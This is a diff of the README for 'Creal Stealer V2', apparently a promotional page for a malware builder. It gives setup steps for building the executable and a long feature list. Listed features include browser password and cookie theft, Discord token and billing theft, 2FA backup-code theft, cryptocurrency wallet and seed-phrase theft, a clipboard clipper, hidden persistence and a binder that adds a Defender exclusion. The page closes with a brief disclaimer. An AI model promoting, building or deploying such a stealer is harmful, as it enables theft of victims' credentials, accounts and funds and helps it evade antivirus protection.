@@ -1,9 +1,9 @@
 <a id="top"></a>
-<h1 align="center">✨ NEW Creal Stealer V2 ✨</h1>
+<h1 align="center">✨ NEW Creal Stealer V2✨</h1>
 
 <p align="center">
   <kbd>
-    <img src="https://i.imgur.com/MjoICHp.png" width="420" alt="Creal Stealer V2">
+    <img src="https://i.imgur.com/MjoICHp.png" width="420">
   </kbd>
 </p>
 
@@ -15,93 +15,114 @@
   <a href="https://skids.rip/discord" target="_blank">✨ Join Our Telegram (Click here!) ✨</a>
 </p>
 
----
 
-## 🌐 Contents
+## 🌐 〢 Content
 
-- [📁 Setting Up](#setup)
+- [📁 Setting up](#setup)
 - [⚔️ Features](#features)
 - [📜 License](#license)
-- [⚠️ Disclaimer](#disclaimer)
-
----
+- [⚠️ Note](#note)
 
 <a id="setup"></a>
 
-### 📁 Setting Up
-
-1. **Install Node.js**: Download it from [Node.js](https://nodejs.org/en/download/prebuilt-installer/current).
-   - **IMPORTANT**: Ensure to install with **"Tools for Native Modules"**. Tick the option `Automatically install the necessary tools`. This will also install Chocolatey.
-
-2. **Run the Installation**: 
-   - Execute the `install.bat` file to install all necessary packages.
-   - After installation, run `start.bat`.
-
-3. **Configure Icon**:
-   - Once built, navigate to the `Resources` folder to choose an icon for your executable.
-   - **Icon Requirements**: The filetype must be `.ico`, and the icon should be one of the following sizes: **16x16px, 32x32px, 64x64px, 128x128px, 256x256px**.
-
 ---
+
+### 📁  〢 Setting Up
+>
+> Install [Node.js](https://nodejs.org/en/download/prebuilt-installer/current) `IMPORTANT: Install NodeJS with Tools for Native Modules`
+> 
+> ***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
+>
+> First run the `install.bat` file to install all necessary packages and `start.bat`.
+>
+> After the build, click `Ressources` to choose an icon for your executable. 
+> ``The filetype must be ".ico" and the icon should be 16x16px, 32x32px, 64x64px, 128x128px, 256x256px`` 
+>
 
 <a id="features"></a>
 
-### ⚔️ Features
-
-#### Stealer Capabilities
-
-- **No Dependent Clipper**: The executable does not need to remain active for the clipper to function.
-- **Wallet Injection**: Supports 12-word recovery phrases and passwords for:
-  - Exodus
-  - Atomic
-- **Persistence**: Hidden startup and automatic recovery if registry entries are deleted.
-- **File Stealer**: Capable of stealing various file types, including `.txt`, `.doc`, `.docx`, `.rdp`, `.pdf`, etc.
-- **Binder**: Excludes files to bypass security measures.
-- **Discord Data**: Retrieves tokens, user details (username, phone number, email, billing), Nitro status, and backup codes.
-- **Backup 2FA Code**: Steals two-factor authentication codes from:
-  - Discord
-  - Epic Games
-  - GitHub
-- **Cryptocurrency Wallets Supported**:
-  - Zcash
-  - Armory
-  - Bytecoin
-  - Jaxx
-  - Exodus
-  - Ethereum
-  - Electrum
-  - Atomic Wallet
-  - Guarda
-  - Coinomi
-  - MetaMask
-- **Browser Data**: Steals passwords, cookies, autofill, and history from:
-  - Chrome
-  - Opera
-  - Firefox
-  - Edge
-  - Brave
-  - Yandex
-- **Screenshots**: Captures screenshots of all screens.
-- **Session Stealers**: For various platforms including Telegram, Riot Games, FTP (FileZilla), VPN, Minecraft, Instagram, Roblox, Steam, TikTok, Twitter, Reddit, and Epic Games Launcher.
 
 ---
+
+### ⚔️ 〢 Features
+
+#### Stealer
+
+> No Dependent Clipper (exe does not need to stay running for the clipper to work)
+>
+> Wallet Injection 12words + passwords [ Exodus, Atomic ]
+> 
+> Percistance Hidden Startup + if reg get deleted = auto come back :)
+>
+> Files Stealer [.txt, .doc, .docx, .rdp, .pdf and more]
+>
+> Binder, will add exclusion to your file to bypass defender.
+> 
+> Discord Token, Friends with rare badges, Credit card
+>
+> Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
+>
+> Discord About Me changer, HQ Guilds Admin/Owner
+>
+> Steal Backup 2FA Code [ Discord, Epic Games, Github ]
+>
+> Grabs crypto wallets -
+> 💸 Zcash
+> 🚀 Armory
+> 📀 Bytecoin
+> 💵 Jaxx
+> 💎 Exodus
+> 📉 Ethereum
+> 🔨 Electrum
+> 🕹️ AtomicWallet
+> 💹 Guarda
+> ⚡ Coinomi
+> 🦊 MetaMask
+>
+> Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
+> Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
+>
+> Screenshots all screen
+>
+> Telegram Session stealer
+>
+> Riot Games Session stealer
+> 
+> FTP stealer (FileZilla)
+>
+> VPN Stealer
+>
+> Growtopia Stealer
+>
+> Minecraft Session stealer & validator
+> 
+> Instagram Session stealer & validator
+> 
+> Roblox Session stealer & validator
+>
+> Steam Session stealer & validator
+>
+> TikTok Session stealer & validator
+>
+> Twitter Session stealer & validator
+>
+> Reddit Session stealer & validator
+>
+> Epic Games Launcher Session stealer
+
 
 <a id="license"></a>
 
-### 📜 License
+---
 
-By downloading this software, you agree to the Commons Clause license. Redistribution or sale of this repository or any of its code is strictly prohibited. For more information, please visit [Commons Clause](https://commonsclause.com/).
+### 📜 〢 License
+
+By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)
+
+<a id="note"></a>
 
 ---
 
-<a id="disclaimer"></a>
+### ⚠️ 〢 Note
 
-### ⚠️ Disclaimer
-
-**Intended Use**: This software is intended strictly for educational purposes, research, and sandbox testing in controlled environments where you have explicit permission to conduct such activities. 
-
-**Liability Waiver**: The creator and contributors of this software disclaim any responsibility for the misuse of this software, including but not limited to, unauthorized access to systems, data theft, or other illegal activities. Use of this software for malicious purposes is prohibited and may violate local, state, or federal laws. 
-
-**Legal Compliance**: Users are responsible for ensuring their use of this software complies with all applicable laws and regulations. The creator cannot be held liable for any legal consequences resulting from the use or misuse of this software.
-
----
-
+I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
